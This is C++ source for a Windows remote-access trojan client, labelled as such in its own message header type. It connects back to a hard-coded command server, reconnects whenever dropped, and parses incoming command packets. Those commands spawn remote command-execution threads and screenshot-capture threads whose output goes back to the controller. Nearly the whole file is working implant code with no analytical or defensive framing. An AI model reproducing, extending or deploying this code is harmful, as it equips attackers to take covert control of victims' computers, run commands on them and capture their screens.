#include "stdafx.h"
#include "server_pic_shoot.h"
#include "server_process_find.h"
#include "server_remote_cmd.h"

#pragma comment (lib, "Ws2_32.lib")

using namespace std;
/************************DATA***********************/

WSADATA wsaData;
SOCKET socketClient;
SOCKADDR_IN socketServer;

char* ServerIP = "127.0.0.1";
u_short ServerPort = 23333;

DWORD MainThreadID;

int netSend = 0;

int netRecv = 1;

int customer = -1;


GLOABLE_EXCHANGE_DATA_BUFFER  gExchangeBuffer;

SEND_DATA_QUEUES gSendDataQueues;

THREAD_POOL gThreadPool;

BOOL gQueueAccessLocked = FALSE;

BOOL sendThreadBusy;

BOOL socketFCKED = FALSE;

int threadIdGenerater = 5;

/***********************THREAD*********************/

BOOL socketInit();

DWORD dataSend(LPVOID lpParameter);

DWORD dataRecv(LPVOID lpParameter);

void newMessageHandler();

DWORD remoteControl(LPVOID lpParameter)
{
	int mID = *(int*)lpParameter;
	RemoteCMD rcmd(mID);
	rcmd.remoteContrl();
	return 0;
}

DWORD picShoot(LPVOID lpParameter)
{
	int mID = *(int*)lpParameter;
	PicShot picShot(mID);
	picShot.PicCircule();
	return 0;
}

int main(int argc, char** argv)
{
	MSG msg;
	MainThreadID = GetCurrentThreadId();

	RAWDATAPOOL sendDataPool;
	RAWDATAPOOL recvDataPool;

	gExchangeBuffer.insert(pair<int, RAWDATAPOOL>(netSend, sendDataPool));
	gExchangeBuffer.insert(pair<int, RAWDATAPOOL>(netRecv, recvDataPool));

	/*if (NULL == (gExchangeBuffer[0].sendEvent = CreateEvent(NULL, TRUE, FALSE, NULL)))
	{
		cout << "Create event failed!" << GetLastError() << endl;
		gExchangeBuffer.clear();
		return -1;
	}*/
	gExchangeBuffer[netRecv].mainRead = new BYTE[1024];

_SocketStart:
	while (!socketInit())
	{
		cout << "Connect Failed!" << endl;
		Sleep(5000);
	}

	sendThreadBusy = FALSE;

	socketFCKED = FALSE;

	/*if (NULL == CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)dataSend, (LPVOID)&netSend, NULL, &(gExchangeBuffer[0].PID)))
	{
		CloseHandle(gExchangeBuffer[netSend].sendEvent);
		delete[] gExchangeBuffer[netRecv].mainRead;
		gExchangeBuffer.clear();
		return -1;
	}*/
	if (NULL == CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)dataRecv, (LPVOID)&netRecv, NULL, &(gExchangeBuffer[1].PID)))
	{
		CloseHandle(gExchangeBuffer[netSend].sendEvent);
		delete[] gExchangeBuffer[netRecv].mainRead;
		gExchangeBuffer.clear();
		return -1;
	}
	while (1)
	{
		if (PeekMessage(&msg, NULL, NULL, NULL, PM_REMOVE))
		{
			switch (msg.message)
			{
			case SOCKET_DISSCONECED:

				socketFCKED = TRUE;
				/*HANDLE sendThread;
				
				if (NULL != (sendThread = OpenThread(THREAD_TERMINATE, FALSE, gExchangeBuffer[netSend].PID)));
				{
					SetEvent(gExchangeBuffer[netSend].sendEvent);
					WaitForSingleObject(sendThread, INFINITE);
					CloseHandle(sendThread);
					ResetEvent(gExchangeBuffer[netSend].sendEvent);
				}*/

				HANDLE recvThread;
				if (NULL != (recvThread = OpenThread(THREAD_TERMINATE, FALSE, gExchangeBuffer[netRecv].PID)));
				{
					WaitForSingleObject(recvThread, INFINITE);
					CloseHandle(recvThread);
				}

				goto _SocketStart;

			case SOCKET_SENDED:
				cout << "SENDED!" << endl;

				if (customer > 1)
				{
					SetEvent(gExchangeBuffer[customer].sendEvent);
					customer = -1;
				}
				break;
			case SCOKET_NEW_MESSAGE:
				newMessageHandler();
			default:
				continue;
			}
		}
		if (gSendDataQueues.empty())
		{
			continue;
		}
		else
		{

			if (!sendThreadBusy)
			{
				while (!gQueueAccessLocked)
				{
					gQueueAccessLocked = TRUE;
					customer = gSendDataQueues.front();
					gSendDataQueues.pop();
					gQueueAccessLocked = FALSE;
					SetEvent(gExchangeBuffer[netSend].sendEvent);
					sendThreadBusy = TRUE;
					break;
				}
			}
		}
	}

	CloseHandle(gExchangeBuffer[netSend].sendEvent);
	delete[] gExchangeBuffer[netRecv].mainRead;
	gExchangeBuffer.clear();
	return 0;
}

BOOL socketInit()
{
	WORD winVersion = MAKEWORD(2, 2);

	if (WSAStartup(winVersion, &wsaData))
	{
		//cout << "Init socket failed!" << endl;
		return FALSE;
	}

	if ((LOBYTE(wsaData.wVersion) != 2) || HIBYTE(wsaData.wVersion) != 2)
	{
		WSACleanup();
		return FALSE;
	}

	socketClient = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (INVALID_SOCKET == socketClient)
	{
		WSACleanup();
		return FALSE;
	}

	socketServer.sin_addr.S_un.S_addr = inet_addr(ServerIP);
	socketServer.sin_family = AF_INET;
	socketServer.sin_port = htons(ServerPort);
	int result = connect(socketClient, (SOCKADDR*)&socketServer, sizeof(SOCKADDR));
	if (result == SOCKET_ERROR)
	{
		cout << hex << WSAGetLastError() << endl;
		return FALSE;
	}

	return TRUE;
}

DWORD dataSend(LPVOID lpParameter)
{
	int mID = *(int*)lpParameter;
	while (1)
	{
		if (socketFCKED)
		{
			sendThreadBusy = TRUE;
			return -1;
		}
		int result;
		if (customer == -1)
		{
			continue;
		}
		else
		{
			BYTE* buffer = gExchangeBuffer[customer].mainRead;
			result = send(socketClient, (char*)buffer, 1024, 0);
		}
		if (result == SOCKET_ERROR)
		{
			PostThreadMessage(MainThreadID, SOCKET_DISSCONECED, NULL, NULL);
			sendThreadBusy = TRUE;
			return -1;
		}

		PostThreadMessage(MainThreadID, SOCKET_SENDED, NULL, NULL);

		ResetEvent(gExchangeBuffer[mID].sendEvent);
		sendThreadBusy = FALSE;
	}

	return 0;
}

DWORD dataRecv(LPVOID lpParameter)
{
	int mID = *(int*)lpParameter;
	BYTE* writeBuffer = gExchangeBuffer[mID].mainRead;
	int result;
	while (1)
	{
		result = recv(socketClient, (char*)writeBuffer, 1024, 0);
		if (result == 0 || socketFCKED)
		{
			cout << hex << WSAGetLastError() << endl;

			if (WSAGetLastError() != 0)
			{
				PostThreadMessage(MainThreadID, SOCKET_DISSCONECED, NULL, NULL);
				return -1;
			}

			continue;
		}
		if (result == SOCKET_ERROR)
		{
			cout << hex << WSAGetLastError() << endl;
			PostThreadMessage(MainThreadID, SOCKET_DISSCONECED, NULL, NULL);
			return -1;
		}
		PostThreadMessage(MainThreadID, SCOKET_NEW_MESSAGE, NULL, NULL);
	}
	return 0;
}

void newMessageHandler()
{
	trojan_head head;

	head.CommandType = (gExchangeBuffer[netRecv].mainRead)[0];
	head.mID = *((int*)(&(gExchangeBuffer[netRecv].mainRead)[1]));
	head.Length = *((int*)(&(gExchangeBuffer[netRecv].mainRead)[5]));

	switch (head.CommandType)
	{
	case SYS_SHUTDOWN_MID:

		HANDLE closeThread;

		PostThreadMessage(gExchangeBuffer[head.mID].PID, TERMINATE_CMD, NULL, NULL);
		if (NULL != (closeThread = OpenThread(THREAD_TERMINATE, FALSE, gExchangeBuffer[head.mID].PID)));
		{
			WaitForSingleObject(closeThread, INFINITE);
			CloseHandle(closeThread);
		}

		delete[] gExchangeBuffer[head.mID].mainRead;
		delete[] gExchangeBuffer[head.mID].mainWrite;
		CloseHandle(gExchangeBuffer[head.mID].sendEvent);

		gExchangeBuffer.erase(head.mID);

		break;

	case SYS_NEW_CMD:
		RAWDATAPOOL at;
		gExchangeBuffer.insert(pair<int, RAWDATAPOOL>(head.mID, at));

		gExchangeBuffer[head.mID].mainRead = new BYTE[1024];
		gExchangeBuffer[head.mID].mainWrite = new BYTE[1024];

		ZeroMemory(gExchangeBuffer[head.mID].mainRead, 1024);
		ZeroMemory(gExchangeBuffer[head.mID].mainWrite, 1024);

		gExchangeBuffer[head.mID].sendEvent = CreateEvent(NULL, TRUE, FALSE, NULL);

		CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)remoteControl, (LPVOID)&(head.mID), NULL, &(gExchangeBuffer[head.mID].PID));
		Sleep(100);

		break;

	case SYS_NEW_PIC_SHOOT:
		RAWDATAPOOL ps;
		gExchangeBuffer[head.mID].mainRead = new BYTE[1024];
		gExchangeBuffer[head.mID].mainWrite = new BYTE[1024];

		ZeroMemory(gExchangeBuffer[head.mID].mainRead, 1024);
		ZeroMemory(gExchangeBuffer[head.mID].mainWrite, 1024);

		gExchangeBuffer[head.mID].sendEvent = CreateEvent(NULL, TRUE, FALSE, NULL);

		CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)picShoot, (LPVOID)&(head.mID), NULL, &(gExchangeBuffer[head.mID].PID));
		Sleep(100);

		break;

	case SYS_NEW_PROC_FIND:

		break;

	case FOR_CMD:
		ZeroMemory(gExchangeBuffer[head.mID].mainWrite, 1024);
		memcpy(gExchangeBuffer[head.mID].mainWrite, &((gExchangeBuffer[netRecv].mainRead)[9]), 1015);
		PostThreadMessage(gExchangeBuffer[head.mID].PID, NEW_CMD_COMMAND, NULL, NULL);

		break;

	default:

		break;
	}
}